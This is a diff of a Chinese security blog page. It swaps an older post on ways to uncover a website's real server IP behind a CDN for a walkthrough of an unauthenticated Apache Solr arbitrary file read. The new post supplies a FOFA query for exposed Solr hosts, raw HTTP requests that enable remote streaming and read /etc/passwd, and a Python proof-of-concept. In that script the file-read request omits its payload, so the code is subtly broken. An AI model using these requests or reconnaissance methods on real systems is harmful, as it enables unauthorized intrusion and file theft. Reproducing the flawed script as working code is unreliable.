@@ -9,7 +9,7 @@
     
     <title>
         
-            04CDN绕过 |
+            Apache Solr任意文件读取漏洞 |
         
         Jackie&#39;s Blog
     </title>
@@ -268,7 +268,7 @@
             <div class="post-content-bottom border-box">
                 
                     <div class="post-title">
-                        04CDN绕过
+                        Apache Solr任意文件读取漏洞
                     </div>
                 
 
@@ -294,12 +294,12 @@
         
             <span class="meta-info-item post-create-date">
                 <i class="icon fa-solid fa-calendar-plus"></i>&nbsp;
-                <span class="datetime">2024-04-14</span>
+                <span class="datetime">2024-09-03</span>
             </span>
 
             <span class="meta-info-item post-update-date">
                 <i class="icon fa-solid fa-file-pen"></i>&nbsp;
-                <span class="datetime" data-updated="Sun Apr 14 2024 15:54:22 GMT+0800">2024-04-14</span>
+                <span class="datetime" data-updated="Wed Sep 04 2024 00:14:25 GMT+0800">2024-09-04</span>
             </span>
         
 
@@ -309,7 +309,7 @@
             <span class="post-tag meta-info-item border-box">
                 <ul class="post-tag-ul">
                     
-                            <li class="tag-item"><span class="tag-separator"><i class="icon fas fa-hashtag"></i></span><a href="/tags/%E5%B0%8F%E8%BF%AA/">小迪</a></li>
+                            <li class="tag-item"><span class="tag-separator"><i class="icon fas fa-hashtag"></i></span><a href="/tags/summary/">summary</a></li>
                         
                     
                 </ul>
@@ -319,12 +319,12 @@
         
         
             <span class="meta-info-item post-wordcount">
-                <i class="icon fas fa-file-word"></i>&nbsp;<span>817 字</span>
+                <i class="icon fas fa-file-word"></i>&nbsp;<span>958 字</span>
             </span>
         
         
             <span class="meta-info-item post-min2read">
-                <i class="icon fas fa-clock"></i>&nbsp;<span>3 分钟</span>
+                <i class="icon fas fa-clock"></i>&nbsp;<span>4 分钟</span>
             </span>
         
         
@@ -342,72 +342,79 @@
                     
 
                     
-                         <h1 id="CDN绕过"><a href="#CDN绕过" class="headerlink" title="CDN绕过"></a>CDN绕过</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CDN知识-工作原理及阻碍</span><br><span class="line">CDN配置-域名&amp;区域&amp;类型</span><br><span class="line">CDN绕过-靠谱十余种技战法</span><br><span class="line">CDN绑定-HOSTS绑定指向访问</span><br></pre></td></tr></table></figure>
+                         <h1 id="Apache-Solr任意文件读取漏洞"><a href="#Apache-Solr任意文件读取漏洞" class="headerlink" title="Apache Solr任意文件读取漏洞"></a>Apache Solr任意文件读取漏洞</h1><p>Apache Solr存在任意文件读取漏洞，攻击者可以在未授权的情况下获取目标服务器敏感文件</p>
+<p><strong>主要原因</strong>：由于未开启身份验证，导致未经身份验证的攻击者可利用Config API打开requestDispatcher.requestParsers.enableRemoteStreaming开关，从而使攻击者可以在未授权的情况下获取目标服务器敏感文件。</p>
+<p><strong>影响版本</strong>：Apache Solr &lt;&#x3D; 8.8.1</p>
+<p><strong>fofa语法</strong>：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">app=&quot;Apache-Solr&quot; &amp;&amp; country=&quot;CN&quot; &amp;&amp; status_code=&quot;200&quot;</span><br></pre></td></tr></table></figure>
 
-<h1 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h1><p>全称Content Delivery Network，即内容分发网络。</p>
-<p>使用户可就近取得所需内容，解决Internet网络拥挤的状况，提高用户访问网站的响应速度。</p>
-<p>关键技术主要有内容存储和分发技术</p>
-<p>传统访问：用户访问域名→解析服务器IP→访问目标主机</p>
-<p>普通CDN：用户访问域名→CDN节点→真实服务器IP→访问目标主机</p>
-<p>带WAF的CDN：用户访问域名→CDN节点（WAF）→真实服务器IP→访问目标主机</p>
-<hr>
-<p>判定标准：nslookup、各地ping</p>
-<h1 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h1><h2 id="漏洞-遗留文件"><a href="#漏洞-遗留文件" class="headerlink" title="漏洞&amp;遗留文件"></a>漏洞&amp;遗留文件</h2><ul>
-<li><p>phpinfo.php探针</p>
-<p>其中_SERVER[“SERVER_ADDR”]有主机信息</p>
-<p>（服务器有多个网卡，获取到的可能是内网IP地址）</p>
-</li>
-<li><p>SSRF漏洞（不止这个漏洞）</p>
-<p>服务器IP地址1开启web服务来记录日志</p>
-<p>网址1有一个SSRF漏洞（会接受用户的数据并利用服务器去请求）</p>
-<p>漏洞去请求地址1</p>
-<p>日志就会记录访问的IP→相当于访问的服务器IP，得到真实IP</p>
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p><a class="link"   target="_blank" rel="noopener" href="http://archive.apache.org/dist/lucene/solr/" >Solr下载地址<i class="fas fa-external-link-alt"></i></a>，安装配置过程不再赘述</p>
 <blockquote>
-<p>ping或请求网站时，自己请求的，所以访问的是CDN节点（正向）</p>
-<p>对方自己的服务器去请求设置的资源，所以是真实IP（反向）</p>
-</blockquote>
-<p>只要漏洞有带有让服务器去请求你设置的资源，就满足条件（XXE、命令执行反弹shell等）</p>
-</li>
-<li><p>历史DNS记录</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://dnsdb.io/zh-cn/</span><br><span class="line">https://x.threatbook.cn/</span><br><span class="line">http://toolbar.netcraft.com/site_report?url=</span><br><span class="line">http://viewdns.info/</span><br><span class="line">http://www.17ce.com/</span><br><span class="line">https://community.riskiq.com/</span><br><span class="line">http://www.crimeflare.com/cfssl.html</span><br></pre></td></tr></table></figure></li>
-</ul>
-<h2 id="子域名查询操作"><a href="#子域名查询操作" class="headerlink" title="子域名查询操作"></a>子域名查询操作</h2><p>可能会加速www但未加速其他子域名</p>
-<p>OneForAll子域名挖掘</p>
-<p><a class="link"   target="_blank" rel="noopener" href="https://github.com/lijiejie/subDomainsBrute" >subDomainsBrute<i class="fas fa-external-link-alt"></i></a></p>
-<p><a class="link"   target="_blank" rel="noopener" href="https://github.com/aboul3la/Sublist3r" >Sublist3r<i class="fas fa-external-link-alt"></i></a></p>
-<h2 id="接口查询国外访问"><a href="#接口查询国外访问" class="headerlink" title="接口查询国外访问"></a>接口查询国外访问</h2><p>小众国家可能不会设置对应的CDN</p>
-<p><a class="link"   target="_blank" rel="noopener" href="https://tools.ipip.net/cdn.php" >国外CDN测试<i class="fas fa-external-link-alt"></i></a></p>
-<p><a class="link"   target="_blank" rel="noopener" href="https://get-site-ip.com/" >查找网站ip<i class="fas fa-external-link-alt"></i></a>（可以互相验证，不一定确定对）</p>
-<h2 id="主动邮件配合备案"><a href="#主动邮件配合备案" class="headerlink" title="主动邮件配合备案"></a>主动邮件配合备案</h2><p>邮件主动发给你（反向）</p>
-<p>邮件-显示原文-“Received: from”</p>
-<h2 id="全网扫描FuckCDN"><a href="#全网扫描FuckCDN" class="headerlink" title="全网扫描FuckCDN"></a>全网扫描FuckCDN</h2><p><a class="link"   target="_blank" rel="noopener" href="https://github.com/Tai7sy/fuckcdn" >FuckCDN<i class="fas fa-external-link-alt"></i></a></p>
+<p>这里的core核心可以理解为数据库，里面的cocument可以理解为表</p>
 <hr>
-<p>找到真实ip后hosts绑定真实ip，后续安全测试即可全部指向真实ip</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;示例ip&#125; &#123;对应域名&#125;</span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<ul>
-<li>Windows：C:\Windows\System32\drivers\etc\hosts</li>
-<li>Linux：&#x2F;etc&#x2F;hosts</li>
-</ul>
+<p>Solr自带开源Servlet容器Jetty，当然可以用Tomcat，这里使用自带的Jetty</p>
 </blockquote>
-<p>通过信息收集，缩小扫描范围，确定一个相对小的IP和端口范围（中国？AS号？B段？等）</p>
-<p>通过http指纹特征和keyword等做综合判断。可使用工具如下：</p>
-<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">https://github.com/zmap/zgrab/</span><br><span class="line">http://www.ipdeny.com/ipblocks/</span><br></pre></td></tr></table></figure>
+<ol>
+<li>获取core信息</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://xxx.xxx.xxx.xxx/solr/admin/cores?indexInfo=false&amp;wt=json</span><br></pre></td></tr></table></figure>
 
-<ul>
-<li><p>zgrab是基于zmap无状态扫描的应用层扫描器,可以自定义数据包，以及ip、domain之间的关联。可用于快速指纹识别爆破等场景。</p>
-<p><a class="link"   href="https://link.zhihu.com/?target=https://levyhsu.com/2017/05/%E5%88%A9%E7%94%A8zgrab%E7%BB%95cdn%E6%89%BE%E7%9C%9F%E5%AE%9Eip/" >利用Zgrab绕CDN找真实IP - Levy Hsu<i class="fas fa-external-link-alt"></i></a></p>
-</li>
-<li><p>Zmap大法</p>
-<p><a class="link"   href="https://link.zhihu.com/?target=http://bobao.360.cn/learning/detail/211.html" >简单获取CDN背后网站的真实IP - 安全客 - 有思想的安全新媒体<i class="fas fa-external-link-alt"></i></a></p>
-</li>
-</ul>
-<h2 id="查询Https证书"><a href="#查询Https证书" class="headerlink" title="查询Https证书"></a>查询Https证书</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://censys.io/</span><br></pre></td></tr></table></figure>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="/2024/09/03/Apache-Solr%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/core%E4%BF%A1%E6%81%AF.png"
+                        alt="core信息"
+                 ></p>
+<ol start="2">
+<li>依据core_name构造config包</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /solr/demo/config HTTP/1.1</span><br><span class="line">Host: 192.168.45.1:8983</span><br><span class="line">Content-Length: 82</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Origin: http:/ip:89833</span><br><span class="line">Content-Type: application/json</span><br><span class="line">User-Agent: User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:129.0) Gecko/20100101 Firefox/129.0 </span><br><span class="line">Accept:text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 </span><br><span class="line">Referer: http://192.168.45.1:8983/solr/demo/config</span><br><span class="line">Accept-Encoding: gzip, deflate </span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6 </span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">&#123;&quot;set-property&quot;:&#123;&quot;requestDispatcher.requestParsers.enableRemoteStreaming&quot;:true&#125;&#125;</span><br></pre></td></tr></table></figure>
 
-<p>这个网址会将互联网所有的ip进行扫面和连接，以及证书探测。若目标站点有https证书，并且默认虚拟主机配了https证书，我们就可以找所有目标站点是该https证书的站点。</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">443.https.tls.certificate.parsed.extensions.subject_alt_name.dns_names:www.xxx.com</span><br></pre></td></tr></table></figure>
+<p>返回包</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: text/plain;charset=utf-8</span><br><span class="line">Content-Length: 149</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">	&quot;responseHeader&quot;:&#123;</span><br><span class="line">		&quot;status&quot;:[]</span><br><span class="line">		&quot;QTime&quot;:256&#125;,</span><br><span class="line">    &quot;WARNING&quot;:&quot;This response format is experimental.  It is likely to change in the future.&quot;&#125;</span><br></pre></td></tr></table></figure>
 
+<p>状态包以及响应内容**”This response format is experimental.  It is likely to change in the future.”**表示存在漏洞</p>
+<ol start="3">
+<li>读取文件&#x2F;etc&#x2F;passwd</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /solr/demo/./debug/dump?param=ContentStreams HTTP/1.1</span><br><span class="line">Host: 192.168.45.1:8983</span><br><span class="line">Content-Length: 31</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1 </span><br><span class="line">Origin: http:/192.168.45.1:89833 </span><br><span class="line">Content-Type: application/x-www-form-urlencoden </span><br><span class="line">User-Agent: User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:129.0) Gecko/20100101 Firefox/129.0 </span><br><span class="line">Accept:text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line">Referer: http://192.168.45.1:8983/solr/demo/config</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">stream.url=file:///etc/passwd</span><br></pre></td></tr></table></figure>
+
+<p>拿到数据</p>
+<h2 id="构建POC"><a href="#构建POC" class="headerlink" title="构建POC"></a>构建POC</h2><blockquote>
+<p>构建poc的基础操作</p>
+<ol>
+<li>利用开源的POC框架，也可以自己写框架（建议使用poc框架）</li>
+<li>熟悉漏洞原理</li>
+<li>搭建漏洞靶场环境</li>
+<li>选择编程语言（常用python）</li>
+</ol>
+<blockquote>
+<p>常用python库：<br>urllib2: 发送HTTP&#x2F;HTTPS请求<br>requests:更“高级”的urllib2库<br>re：正则表达式<br>random：生成随机数<br>base64：base64编码<br>hashlib:常用来计算md5值<br>time：用来统计访问时间延迟</p>
+</blockquote>
+</blockquote>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> json</span><br></pre></td></tr></table></figure>
+
+<ol>
+<li>获取core的信息</li>
+</ol>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#拼接url然后提取name值</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_core_name</span>(<span class="params">target_url</span>):</span><br><span class="line">    core_url = target_url + <span class="string">&quot;/solr/admin/cores?indexInfo=false&amp;wt=json&quot;</span></span><br><span class="line">    reqs = requests.get(url=core_url,timeout=<span class="number">10</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        core_name = <span class="built_in">list</span>(json.loads(reqs.text)[<span class="string">&quot;status&quot;</span>])[<span class="number">0</span>]</span><br><span class="line">        <span class="keyword">return</span> core_name</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="comment"># print (&quot;无法提取&quot;)</span></span><br><span class="line">        sys.exit()</span><br></pre></td></tr></table></figure>
+
+<ol start="2">
+<li>依据core_name构造config包</li>
+</ol>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#构造config包</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">enable_remote_streaming</span>(<span class="params">target_url,core_name</span>):</span><br><span class="line">    session = requests.session()</span><br><span class="line">    vuln_url = target_url + <span class="string">&quot;/solr/&quot;</span> + core_name + <span class="string">&quot;/config&quot;</span></span><br><span class="line">    headers = &#123;<span class="string">&quot;Content-type&quot;</span>: <span class="string">&quot;application/json&quot;</span>&#125;</span><br><span class="line">    data = <span class="string">&#x27;&#123;&quot;set-property&quot; : &#123;&quot;requestDispatcher.requestParsers.enableRemoteStreaming&quot;:true&#125;&#125;&#x27;</span></span><br><span class="line">    reqs = session.post(url=vuln_url, data=data, headers=headers, verify=<span class="literal">False</span>, timeout=<span class="number">10</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;responseHeader&quot;</span> <span class="keyword">in</span> reqs.text <span class="keyword">and</span> reqs.status_code == <span class="number">200</span>:</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&quot;存在漏洞&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&quot;不存在漏洞&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br></pre></td></tr></table></figure>
+
+<ol start="3">
+<li>读取文件&#x2F;etc&#x2F;passwd</li>
+</ol>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#构造查看/etc/passwd的包</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read_etc_passwd</span>(<span class="params">target_url,core_name</span>):</span><br><span class="line">    session = requests.session()</span><br><span class="line">    vuln_url = target_url + <span class="string">&quot;/solr/&#123;&#125;/debug/dump?param=ContentStreams&quot;</span>.<span class="built_in">format</span>(core_name)</span><br><span class="line">    headers = &#123;<span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/x-www-form-urlencoded&quot;</span>&#125;</span><br><span class="line">    reqs = session.post(url=vuln_url,headers=headers)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> reqs.status_code == <span class="number">200</span>:</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&quot;读取成功&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span> (reqs.text)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br></pre></td></tr></table></figure>
+
+<ol start="4">
+<li>执行并输出</li>
+</ol>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>(<span class="params">target_url</span>):</span><br><span class="line">    core_name = get_core_name(target_url)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> core_name:</span><br><span class="line">        <span class="keyword">if</span> enable_remote_streaming(target_url,core_name):</span><br><span class="line">            read_etc_passwd(target_url,core_name)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    TARGET_URL = <span class="string">&quot;http://ip:8983&quot;</span></span><br><span class="line">    main(TARGET_URL)</span><br></pre></td></tr></table></figure>
+
+<p>参考文章：<a class="link"   target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/ycXsYc7ZYc22o-8Q5ALBYQ" >https://mp.weixin.qq.com/s/ycXsYc7ZYc22o-8Q5ALBYQ<i class="fas fa-external-link-alt"></i></a></p>
 
                     
                 </div>
@@ -420,7 +427,7 @@
                             <ul class="post-tags-box border-box">
                                 
                                     <li class="tag-item border-box">
-                                        <i class="icon fas fa-hashtag"></i>&nbsp;<a href="/tags/%E5%B0%8F%E8%BF%AA/">小迪</a>
+                                        <i class="icon fas fa-hashtag"></i>&nbsp;<a href="/tags/summary/">summary</a>
                                     </li>
                                 
                             </ul>
@@ -459,31 +466,15 @@
                 
                     <div class="post-nav border-box">
                         
-                            <div class="prev-post">
-                                <a class="prev"
-                                   rel="prev"
-                                   href="/2024/04/14/05PHP%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/"
-                                   title="05PHP个人博客"
-                                >
-                                    <span class="left arrow-icon flex-center">
-                                        <i class="fas fa-chevron-left"></i>
-                                    </span>
-                                    <span class="title flex-center">
-                                        <span class="post-nav-title-item text-ellipsis">05PHP个人博客</span>
-                                        <span class="post-nav-item">上一篇</span>
-                                    </span>
-                                </a>
-                            </div>
-                        
                         
                             <div class="next-post">
                                 <a class="next"
                                    rel="next"
-                                   href="/2024/04/14/03%E4%BF%A1%E6%81%AF%E6%89%93%E7%82%B9/"
-                                   title="03信息打点"
+                                   href="/2024/07/09/ArkTS/"
+                                   title="ArkTS"
                                 >
                                     <span class="title flex-center">
-                                        <span class="post-nav-title-item text-ellipsis">03信息打点</span>
+                                        <span class="post-nav-title-item text-ellipsis">ArkTS</span>
                                         <span class="post-nav-item">下一篇</span>
                                     </span>
                                     <span class="right arrow-icon flex-center">
@@ -592,7 +583,7 @@
             <div class="pc-post-toc right-toc">
                 <div class="post-toc-wrap border-box">
     <div class="post-toc border-box">
-        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#CDN%E7%BB%95%E8%BF%87"><span class="nav-text">CDN绕过</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86"><span class="nav-text">前置知识</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%BB%95%E8%BF%87"><span class="nav-text">绕过</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E-%E9%81%97%E7%95%99%E6%96%87%E4%BB%B6"><span class="nav-text">漏洞&amp;遗留文件</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%AD%90%E5%9F%9F%E5%90%8D%E6%9F%A5%E8%AF%A2%E6%93%8D%E4%BD%9C"><span class="nav-text">子域名查询操作</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%8E%A5%E5%8F%A3%E6%9F%A5%E8%AF%A2%E5%9B%BD%E5%A4%96%E8%AE%BF%E9%97%AE"><span class="nav-text">接口查询国外访问</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%BB%E5%8A%A8%E9%82%AE%E4%BB%B6%E9%85%8D%E5%90%88%E5%A4%87%E6%A1%88"><span class="nav-text">主动邮件配合备案</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%85%A8%E7%BD%91%E6%89%AB%E6%8F%8FFuckCDN"><span class="nav-text">全网扫描FuckCDN</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%9F%A5%E8%AF%A2Https%E8%AF%81%E4%B9%A6"><span class="nav-text">查询Https证书</span></a></li></ol></li></ol>
+        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Apache-Solr%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E"><span class="nav-text">Apache Solr任意文件读取漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0"><span class="nav-text">漏洞复现</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%9E%84%E5%BB%BAPOC"><span class="nav-text">构建POC</span></a></li></ol></li></ol>
     </div>
 </div>
 
@@ -761,7 +752,7 @@
             <div class="tablet-post-toc">
                 <div class="post-toc-wrap border-box">
     <div class="post-toc border-box">
-        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#CDN%E7%BB%95%E8%BF%87"><span class="nav-text">CDN绕过</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86"><span class="nav-text">前置知识</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%BB%95%E8%BF%87"><span class="nav-text">绕过</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E-%E9%81%97%E7%95%99%E6%96%87%E4%BB%B6"><span class="nav-text">漏洞&amp;遗留文件</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%AD%90%E5%9F%9F%E5%90%8D%E6%9F%A5%E8%AF%A2%E6%93%8D%E4%BD%9C"><span class="nav-text">子域名查询操作</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%8E%A5%E5%8F%A3%E6%9F%A5%E8%AF%A2%E5%9B%BD%E5%A4%96%E8%AE%BF%E9%97%AE"><span class="nav-text">接口查询国外访问</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%BB%E5%8A%A8%E9%82%AE%E4%BB%B6%E9%85%8D%E5%90%88%E5%A4%87%E6%A1%88"><span class="nav-text">主动邮件配合备案</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%85%A8%E7%BD%91%E6%89%AB%E6%8F%8FFuckCDN"><span class="nav-text">全网扫描FuckCDN</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%9F%A5%E8%AF%A2Https%E8%AF%81%E4%B9%A6"><span class="nav-text">查询Https证书</span></a></li></ol></li></ol>
+        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Apache-Solr%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E"><span class="nav-text">Apache Solr任意文件读取漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0"><span class="nav-text">漏洞复现</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%9E%84%E5%BB%BAPOC"><span class="nav-text">构建POC</span></a></li></ol></li></ol>
     </div>
 </div>
 
